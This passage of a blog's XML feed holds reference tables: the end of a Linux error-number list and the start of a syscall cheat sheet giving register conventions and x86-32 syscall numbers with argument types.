align="center">0x36</td><td>EXFULL</td><td>Exchange full</td></tr><tr><td align="center">55</td><td align="center">0x37</td><td>ENOANO</td><td>No anode</td></tr><tr><td align="center">56</td><td align="center">0x38</td><td>EBADRQC</td><td>Invalid request code</td></tr><tr><td align="center">57</td><td align="center">0x39</td><td>EBADSLT</td><td>Invalid slot</td></tr><tr><td align="center">58</td><td align="center">0x3a</td><td></td><td><em>not implemented</em></td></tr><tr><td align="center">59</td><td align="center">0x3b</td><td>EBFONT</td><td>Bad font file format</td></tr><tr><td align="center">60</td><td align="center">0x3c</td><td>ENOSTR</td><td>Device not a stream</td></tr><tr><td align="center">61</td><td align="center">0x3d</td><td>ENODATA</td><td>No data available</td></tr><tr><td align="center">62</td><td align="center">0x3e</td><td>ETIME</td><td>Timer expired</td></tr><tr><td align="center">63</td><td align="center">0x3f</td><td>ENOSR</td><td>Out of streams resources</td></tr><tr><td align="center">64</td><td align="center">0x40</td><td>ENONET</td><td>Machine is not on the network</td></tr><tr><td align="center">65</td><td align="center">0x41</td><td>ENOPKG</td><td>Package not installed</td></tr><tr><td align="center">66</td><td align="center">0x42</td><td>EREMOTE</td><td>Object is remote</td></tr><tr><td align="center">67</td><td align="center">0x43</td><td>ENOLINK</td><td>Link has been severed</td></tr><tr><td align="center">68</td><td align="center">0x44</td><td>EADV</td><td>Advertise error</td></tr><tr><td align="center">69</td><td align="center">0x45</td><td>ESRMNT</td><td>Srmount error</td></tr><tr><td align="center">70</td><td align="center">0x46</td><td>ECOMM</td><td>Communication error on send</td></tr><tr><td align="center">71</td><td align="center">0x47</td><td>EPROTO</td><td>Protocol error</td></tr><tr><td align="center">72</td><td align="center">0x48</td><td>EMULTIHOP</td><td>Multihop attempted</td></tr><tr><td align="center">73</td><td align="center">0x49</td><td>EDOTDOT</td><td>RFS specific error</td></tr><tr><td align="center">74</td><td align="center">0x4a</td><td>EBADMSG</td><td>Bad message</td></tr><tr><td align="center">75</td><td align="center">0x4b</td><td>EOVERFLOW</td><td>Value too large for defined data type</td></tr><tr><td align="center">76</td><td align="center">0x4c</td><td>ENOTUNIQ</td><td>Name not unique on network</td></tr><tr><td align="center">77</td><td align="center">0x4d</td><td>EBADFD</td><td>File descriptor in bad state</td></tr><tr><td align="center">78</td><td align="center">0x4e</td><td>EREMCHG</td><td>Remote address changed</td></tr><tr><td align="center">79</td><td align="center">0x4f</td><td>ELIBACC</td><td>Can not access a needed shared library</td></tr><tr><td align="center">80</td><td align="center">0x50</td><td>ELIBBAD</td><td>Accessing a corrupted shared library</td></tr><tr><td align="center">81</td><td align="center">0x51</td><td>ELIBSCN</td><td>.lib section in a.out corrupted</td></tr><tr><td align="center">82</td><td align="center">0x52</td><td>ELIBMAX</td><td>Attempting to link in too many shared libraries</td></tr><tr><td align="center">83</td><td align="center">0x53</td><td>ELIBEXEC</td><td>Cannot exec a shared library directly</td></tr><tr><td align="center">84</td><td align="center">0x54</td><td>EILSEQ</td><td>Invalid or incomplete multibyte or wide character</td></tr><tr><td align="center">85</td><td align="center">0x55</td><td>ERESTART</td><td>Interrupted system call should be restarted</td></tr><tr><td align="center">86</td><td align="center">0x56</td><td>ESTRPIPE</td><td>Streams pipe error</td></tr><tr><td align="center">87</td><td align="center">0x57</td><td>EUSERS</td><td>Too many users</td></tr><tr><td align="center">88</td><td align="center">0x58</td><td>ENOTSOCK</td><td>Socket operation on non-socket</td></tr><tr><td align="center">89</td><td align="center">0x59</td><td>EDESTADDRREQ</td><td>Destination address required</td></tr><tr><td align="center">90</td><td align="center">0x5a</td><td>EMSGSIZE</td><td>Message too long</td></tr><tr><td align="center">91</td><td align="center">0x5b</td><td>EPROTOTYPE</td><td>Protocol wrong type for socket</td></tr><tr><td align="center">92</td><td align="center">0x5c</td><td>ENOPROTOOPT</td><td>Protocol not available</td></tr><tr><td align="center">93</td><td align="center">0x5d</td><td>EPROTONOSUPPORT</td><td>Protocol not supported</td></tr><tr><td align="center">94</td><td align="center">0x5e</td><td>ESOCKTNOSUPPORT</td><td>Socket type not supported</td></tr><tr><td align="center">95</td><td align="center">0x5f</td><td>EOPNOTSUPP</td><td>Operation not supported</td></tr><tr><td align="center">95</td><td align="center">0x5f</td><td>ENOTSUP</td><td><em>(Same value as EOPNOTSUPP)</em> Operation not supported</td></tr><tr><td align="center">96</td><td align="center">0x60</td><td>EPFNOSUPPORT</td><td>Protocol family not supported</td></tr><tr><td align="center">97</td><td align="center">0x61</td><td>EAFNOSUPPORT</td><td>Address family not supported by protocol</td></tr><tr><td align="center">98</td><td align="center">0x62</td><td>EADDRINUSE</td><td>Address already in use</td></tr><tr><td align="center">99</td><td align="center">0x63</td><td>EADDRNOTAVAIL</td><td>Cannot assign requested address</td></tr><tr><td align="center">100</td><td align="center">0x64</td><td>ENETDOWN</td><td>Network is down</td></tr><tr><td align="center">101</td><td align="center">0x65</td><td>ENETUNREACH</td><td>Network is unreachable</td></tr><tr><td align="center">102</td><td align="center">0x66</td><td>ENETRESET</td><td>Network dropped connection on reset</td></tr><tr><td align="center">103</td><td align="center">0x67</td><td>ECONNABORTED</td><td>Software caused connection abort</td></tr><tr><td align="center">104</td><td align="center">0x68</td><td>ECONNRESET</td><td>Connection reset by peer</td></tr><tr><td align="center">105</td><td align="center">0x69</td><td>ENOBUFS</td><td>No buffer space available</td></tr><tr><td align="center">106</td><td align="center">0x6a</td><td>EISCONN</td><td>Transport endpoint is already connected</td></tr><tr><td align="center">107</td><td align="center">0x6b</td><td>ENOTCONN</td><td>Transport endpoint is not connected</td></tr><tr><td align="center">108</td><td align="center">0x6c</td><td>ESHUTDOWN</td><td>Cannot send after transport endpoint shutdown</td></tr><tr><td align="center">109</td><td align="center">0x6d</td><td>ETOOMANYREFS</td><td>Too many references: cannot splice</td></tr><tr><td align="center">110</td><td align="center">0x6e</td><td>ETIMEDOUT</td><td>Connection timed out</td></tr><tr><td align="center">111</td><td align="center">0x6f</td><td>ECONNREFUSED</td><td>Connection refused</td></tr><tr><td align="center">112</td><td align="center">0x70</td><td>EHOSTDOWN</td><td>Host is down</td></tr><tr><td align="center">113</td><td align="center">0x71</td><td>EHOSTUNREACH</td><td>No route to host</td></tr><tr><td align="center">114</td><td align="center">0x72</td><td>EALREADY</td><td>Operation already in progress</td></tr><tr><td align="center">115</td><td align="center">0x73</td><td>EINPROGRESS</td><td>Operation now in progress</td></tr><tr><td align="center">116</td><td align="center">0x74</td><td>ESTALE</td><td>Stale file handle</td></tr><tr><td align="center">117</td><td align="center">0x75</td><td>EUCLEAN</td><td>Structure needs cleaning</td></tr><tr><td align="center">118</td><td align="center">0x76</td><td>ENOTNAM</td><td>Not a XENIX named type file</td></tr><tr><td align="center">119</td><td align="center">0x77</td><td>ENAVAIL</td><td>No XENIX semaphores available</td></tr><tr><td align="center">120</td><td align="center">0x78</td><td>EISNAM</td><td>Is a named type file</td></tr><tr><td align="center">121</td><td align="center">0x79</td><td>EREMOTEIO</td><td>Remote I/O error</td></tr><tr><td align="center">122</td><td align="center">0x7a</td><td>EDQUOT</td><td>Disk quota exceeded</td></tr><tr><td align="center">123</td><td align="center">0x7b</td><td>ENOMEDIUM</td><td>No medium found</td></tr><tr><td align="center">124</td><td align="center">0x7c</td><td>EMEDIUMTYPE</td><td>Wrong medium type</td></tr><tr><td align="center">125</td><td align="center">0x7d</td><td>ECANCELED</td><td>Operation canceled</td></tr><tr><td align="center">126</td><td align="center">0x7e</td><td>ENOKEY</td><td>Required key not available</td></tr><tr><td align="center">127</td><td align="center">0x7f</td><td>EKEYEXPIRED</td><td>Key has expired</td></tr><tr><td align="center">128</td><td align="center">0x80</td><td>EKEYREVOKED</td><td>Key has been revoked</td></tr><tr><td align="center">129</td><td align="center">0x81</td><td>EKEYREJECTED</td><td>Key was rejected by service</td></tr><tr><td align="center">130</td><td align="center">0x82</td><td>EOWNERDEAD</td><td>Owner died</td></tr><tr><td align="center">131</td><td align="center">0x83</td><td>ENOTRECOVERABLE</td><td>State not recoverable</td></tr><tr><td align="center">132</td><td align="center">0x84</td><td>ERFKILL</td><td>Operation not possible due to RF-kill</td></tr><tr><td align="center">133</td><td align="center">0x85</td><td>EHWPOISON</td><td>Memory page has hardware error</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">Common error numbers.</summary>
    
    
    
    <category term="Hack" scheme="https://srpopty.github.io/categories/Hack/"/>
    
    
    <category term="Pwn" scheme="https://srpopty.github.io/tags/Pwn/"/>
    
    <category term="CheatSheet" scheme="https://srpopty.github.io/tags/CheatSheet/"/>
    
  </entry>
  
  <entry>
    <title>Syscall CheatSheet</title>
    <link href="https://srpopty.github.io/2020/10/26/Syscall-CheatSheet/"/>
    <id>https://srpopty.github.io/2020/10/26/Syscall-CheatSheet/</id>
    <published>2020-10-26T08:36:33.000Z</published>
    <updated>2021-07-31T12:54:15.999Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x0-Syscall-args"><a href="#0x0-Syscall-args" class="headerlink" title="0x0 Syscall args"></a>0x0 Syscall args</h1><table><thead><tr><th align="center">arch</th><th align="center">syscall NR</th><th align="center">return</th><th align="center">arg0</th><th align="center">arg1</th><th align="center">arg2</th><th align="center">arg3</th><th align="center">arg4</th><th align="center">arg5</th></tr></thead><tbody><tr><td align="center">arm</td><td align="center">r7</td><td align="center">r0</td><td align="center">r0</td><td align="center">r1</td><td align="center">r2</td><td align="center">r3</td><td align="center">r4</td><td align="center">r5</td></tr><tr><td align="center">arm64</td><td align="center">x8</td><td align="center">x0</td><td align="center">x0</td><td align="center">x1</td><td align="center">x2</td><td align="center">x3</td><td align="center">x4</td><td align="center">x5</td></tr><tr><td align="center">x86</td><td align="center">eax</td><td align="center">eax</td><td align="center">ebx</td><td align="center">ecx</td><td align="center">edx</td><td align="center">esi</td><td align="center">edi</td><td align="center">ebp</td></tr><tr><td align="center">x86_64</td><td align="center">rax</td><td align="center">rax</td><td align="center">rdi</td><td align="center">rsi</td><td align="center">rdx</td><td align="center">r10</td><td align="center">r8</td><td align="center">r9</td></tr></tbody></table><h1 id="0x1-x86-32bit"><a href="#0x1-x86-32bit" class="headerlink" title="0x1 x86-32bit"></a>0x1 x86-32bit</h1><table><thead><tr><th align="center">NR</th><th>syscall name</th><th align="center">references</th><th align="center">%eax</th><th>arg0 (%ebx)</th><th>arg1 (%ecx)</th><th>arg2 (%edx)</th><th>arg3 (%esi)</th><th>arg4 (%edi)</th><th>arg5 (%ebp)</th></tr></thead><tbody><tr><td align="center">0</td><td>restart_syscall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/restart_syscall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*restart_syscall">cs/</a></td><td align="center">0x00</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">1</td><td>exit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/exit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*exit">cs/</a></td><td align="center">0x01</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">2</td><td>fork</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fork.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fork">cs/</a></td><td align="center">0x02</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">3</td><td>read</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/read.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*read">cs/</a></td><td align="center">0x03</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">4</td><td>write</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/write.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*write">cs/</a></td><td align="center">0x04</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">5</td><td>open</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*open">cs/</a></td><td align="center">0x05</td><td>const char *filename</td><td>int flags</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">6</td><td>close</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/close.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*close">cs/</a></td><td align="center">0x06</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">7</td><td>waitpid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/waitpid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*waitpid">cs/</a></td><td align="center">0x07</td><td>pid_t pid</td><td>int *stat_addr</td><td>int options</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">8</td><td>creat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/creat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*creat">cs/</a></td><td align="center">0x08</td><td>const char *pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">9</td><td>link</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/link.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*link">cs/</a></td><td align="center">0x09</td><td>const char *oldname</td><td>const char *newname</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">10</td><td>unlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/unlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unlink">cs/</a></td><td align="center">0x0a</td><td>const char *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">11</td><td>execve</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/execve.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*execve">cs/</a></td><td align="center">0x0b</td><td>const char *filename</td><td>const char *const *argv</td><td>const char *const *envp</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">12</td><td>chdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chdir">cs/</a></td><td align="center">0x0c</td><td>const char *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">13</td><td>time</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/time.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*time">cs/</a></td><td align="center">0x0d</td><td>time_t *tloc</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">14</td><td>mknod</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mknod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mknod">cs/</a></td><td align="center">0x0e</td><td>const char *filename</td><td>umode_t mode</td><td>unsigned dev</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">15</td><td>chmod</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chmod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chmod">cs/</a></td><td align="center">0x0f</td><td>const char *filename</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">16</td><td>lchown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lchown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lchown">cs/</a></td><td align="center">0x10</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">17</td><td>break</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/break.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*break">cs/</a></td><td align="center">0x11</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">18</td><td>oldstat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/oldstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*oldstat">cs/</a></td><td align="center">0x12</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">19</td><td>lseek</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lseek.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lseek">cs/</a></td><td align="center">0x13</td><td>unsigned int fd</td><td>off_t offset</td><td>unsigned int whence</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">20</td><td>getpid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpid">cs/</a></td><td align="center">0x14</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">21</td><td>mount</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mount.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mount">cs/</a></td><td align="center">0x15</td><td>char *dev_name</td><td>char *dir_name</td><td>char *type</td><td>unsigned long flags</td><td>void *data</td><td>-</td></tr><tr><td align="center">22</td><td>umount</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/umount.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*umount">cs/</a></td><td align="center">0x16</td><td>char *name</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">23</td><td>setuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setuid">cs/</a></td><td align="center">0x17</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">24</td><td>getuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getuid">cs/</a></td><td align="center">0x18</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">25</td><td>stime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/stime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*stime">cs/</a></td><td align="center">0x19</td><td>time_t *tptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">26</td><td>ptrace</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ptrace">cs/</a></td><td align="center">0x1a</td><td>long request</td><td>long pid</td><td>unsigned long addr</td><td>unsigned long data</td><td>-</td><td>-</td></tr><tr><td align="center">27</td><td>alarm</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/alarm.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*alarm">cs/</a></td><td align="center">0x1b</td><td>unsigned int seconds</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">28</td><td>oldfstat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/oldfstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*oldfstat">cs/</a></td><td align="center">0x1c</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">29</td><td>pause</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pause.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pause">cs/</a></td><td align="center">0x1d</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">30</td><td>utime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/utime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*utime">cs/</a></td><td align="center">0x1e</td><td>char *filename</td><td>struct utimbuf *times</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">31</td><td>stty</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/stty.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*stty">cs/</a></td><td align="center">0x1f</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">32</td><td>gtty</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/gtty.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*gtty">cs/</a></td><td align="center">0x20</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">33</td><td>access</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/access.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*access">cs/</a></td><td align="center">0x21</td><td>const char *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">34</td><td>nice</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/nice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nice">cs/</a></td><td align="center">0x22</td><td>int increment</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">35</td><td>ftime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ftime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ftime">cs/</a></td><td align="center">0x23</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">36</td><td>sync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sync">cs/</a></td><td align="center">0x24</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">37</td><td>kill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kill">cs/</a></td><td align="center">0x25</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">38</td><td>rename</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rename.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rename">cs/</a></td><td align="center">0x26</td><td>const char *oldname</td><td>const char *newname</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">39</td><td>mkdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mkdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mkdir">cs/</a></td><td align="center">0x27</td><td>const char *pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">40</td><td>rmdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rmdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rmdir">cs/</a></td><td align="center">0x28</td><td>const char *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">41</td><td>dup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/dup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup">cs/</a></td><td align="center">0x29</td><td>unsigned int fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">42</td><td>pipe</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pipe.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pipe">cs/</a></td><td align="center">0x2a</td><td>int *fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">43</td><td>times</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/times.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*times">cs/</a></td><td align="center">0x2b</td><td>struct tms *tbuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">44</td><td>prof</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/prof.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*prof">cs/</a></td><td align="center">0x2c</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">45</td><td>brk</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/brk.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*brk">cs/</a></td><td align="center">0x2d</td><td>unsigned long brk</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">46</td><td>setgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgid">cs/</a></td><td align="center">0x2e</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">47</td><td>getgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgid">cs/</a></td><td align="center">0x2f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">48</td><td>signal</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/signal.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*signal">cs/</a></td><td align="center">0x30</td><td>int sig</td><td>__sighandler_t handler</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">49</td><td>geteuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/geteuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*geteuid">cs/</a></td><td align="center">0x31</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">50</td><td>getegid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getegid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getegid">cs/</a></td><td align="center">0x32</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">51</td><td>acct</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/acct.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*acct">cs/</a></td><td align="center">0x33</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">52</td><td>umount2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/umount2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*umount2">cs/</a></td><td align="center">0x34</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">53</td><td>lock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lock">cs/</a></td><td align="center">0x35</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">54</td><td>ioctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioctl">cs/</a></td><td align="center">0x36</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">55</td><td>fcntl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fcntl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fcntl">cs/</a></td><td align="center">0x37</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">56</td><td>mpx</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mpx.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mpx">cs/</a></td><td align="center">0x38</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">57</td><td>setpgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setpgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setpgid">cs/</a></td><td align="center">0x39</td><td>pid_t pid</td><td>pid_t 